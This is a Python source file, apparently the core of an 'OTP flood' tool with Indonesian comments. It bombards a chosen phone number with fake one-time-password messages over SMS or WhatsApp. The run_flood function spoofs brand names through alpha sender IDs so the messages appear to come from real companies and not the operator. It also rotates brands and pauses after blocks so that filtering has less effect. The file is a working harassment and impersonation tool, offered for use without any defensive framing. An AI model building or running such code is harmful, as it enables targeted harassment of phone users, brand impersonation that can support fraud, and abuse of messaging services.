"""
OTP Flood - Main Engine
Orchestrates flood execution with dual sender support:
  Mode 1: WhatsApp (Baileys) - real WA, QR scan, nomor lo keliatan
  Mode 2: SMS (Alpha Sender ID) - pake SMS gateway, tampil sebagai brand
"""

from datetime import datetime
import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from modules.otp_flood.profiles import PROFILES, get_generator
from modules.otp_flood.templates import CATEGORIES, get_brands_by_category, format_brand_message
from modules.otp_flood.sender_sms import SMSSender, _color
from modules.otp_flood.reporter import generate_report, save_report


def run_flood(config):
    """
    Execute OTP flood.
    
    config includes:
      - mode: "wa" or "sms"
      - target: phone number
      - profile: attack profile key
      - max_messages, interval, block_cooldown
      - categories: brand categories or None (ALL)
    """
    target = config["target"]
    profile_key = config.get("profile", "linear")
    max_msgs = config.get("max_messages", 50)
    block_cooldown = config.get("block_cooldown", 60)
    rotate = profile_key == "rotating"
    mode = config.get("mode", "sms")

    # Get brands
    cats = config.get("categories")
    brands = get_brands_by_category(cats)

    # Init sender based on mode
    sender = SMSSender(target)
    
    gen = get_generator(profile_key, {"interval": config.get("interval", 3)})

    results = {
        "total_sent": 0,
        "total_blocked": 0,
        "total_errors": 0,
        "start_time": datetime.now().strftime("%H:%M:%S"),
        "end_time": "",
        "logs": [],
    }

    consecutive_blocks = 0

    # Mode header
    if mode == "sms":
        yield f"\n  {_color.B}{_color.GRN}📡 MODE SMS — Alpha Sender ID aktif{_color.RST}\n"
        yield f"  {_color.DIM}Pesan masuk target akan tampil sebagai nama BRAND (bukan nomor lo){_color.RST}\n\n"
    else:
        yield f"\n  {_color.B}{_color.CYN}💬 MODE WHATSAPP — QR scan diperlukan{_color.RST}\n"
        yield f"  {_color.DIM}Pesan masuk target tampil dari nomor WA lo{_color.RST}\n\n"

    for i in range(max_msgs):
        # Pick brand
        if rotate and brands:
            brand = brands[i % len(brands)]
        elif brands:
            brand = brands[0]
        else:
            brand = None

        # Generate message
        if brand:
            msg_data = format_brand_message(brand)
        else:
            msg_data = {
                "brand": "OTP",
                "category": "unknown",
                "otp": str(abs(hash(str(i)) % 1000000)).zfill(6),
                "message": f"Kode OTP Anda: {str(abs(hash(str(i)) % 1000000)).zfill(6)}",
                "sender": "OTP",
            }

        # SEND
        if mode == "sms":
            # SMS mode: pakai alpha sender ID → muncul sebagai brand!
            result = sender.send(msg_data["message"], msg_data["sender"])
        else:
            # WA mode: panggil sender WA yang lama
            from modules.otp_flood.sender import Sender as WASender
            wa = WASender(target)
            result = wa.send(msg_data["message"], msg_data["sender"])

        timestamp = datetime.now().strftime("%H:%M:%S")
        sender_display = result.get("sender_display", msg_data["brand"])
        results["logs"].append(f"{timestamp}  [{sender_display}] OTP: {msg_data['otp']}")

        if result["status"] == "sent":
            results["total_sent"] += 1
            consecutive_blocks = 0
            icon = "✅"
        elif result["status"] == "blocked":
            results["total_blocked"] += 1
            consecutive_blocks += 1
            icon = "🔴"
        else:
            results["total_errors"] += 1
            consecutive_blocks += 1
            icon = "⚠️"

        # Progress
        progress = f"[{i+1}/{max_msgs}]"
        bar_len = 25
        filled = int((i + 1) / max_msgs * bar_len)
        bar = "█" * filled + "░" * (bar_len - filled)

        total_so_far = results["total_sent"] + results["total_blocked"] + results["total_errors"]
        det_rate = results["total_blocked"] / total_so_far * 100 if total_so_far > 0 else 0

        yield (
            f"\033[2K{icon} {progress} {bar}\n"
            f"\033[2K  📤 Terkirim: {results['total_sent']} | "
            f"🚫 Gagal: {results['total_blocked'] + results['total_errors']}\n"
            f"\033[2K  📊 Rate: {det_rate:.0f}% fail | "
            f"🕐 {timestamp} | 📨 via [{sender_display}]\n"
        )

        # Cooldown on errors
        if consecutive_blocks >= 3:
            yield f"\n\033[2K  ⏸  Gagal {consecutive_blocks}x berturut-turut! Cooldown {block_cooldown}s...\n"
            for remaining in range(block_cooldown, -1, -1):
                yield f"\033[2K  ⏳ Cooldown: {remaining}s   \r"
                time.sleep(1)
            yield f"\033[2K  ✅ Resume\n"
            consecutive_blocks = 0

        # Next interval
        try:
            wait = next(gen)
            if wait > 0:
                for s in range(int(wait), 0, -1):
                    yield f"\033[2K  ⏱  Berikutnya dalam {s}s...\r"
                    time.sleep(1)
        except StopIteration:
            break

    results["end_time"] = datetime.now().strftime("%H:%M:%S")

    # Report
    report_text, grade, det_rate = generate_report(results, config)
    yield f"\n\n{report_text}\n"

    output_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "reports")
    os.makedirs(output_dir, exist_ok=True)
    saved = save_report(report_text, output_dir)
    if saved:
        yield f"  📄 Report: {saved}\n"
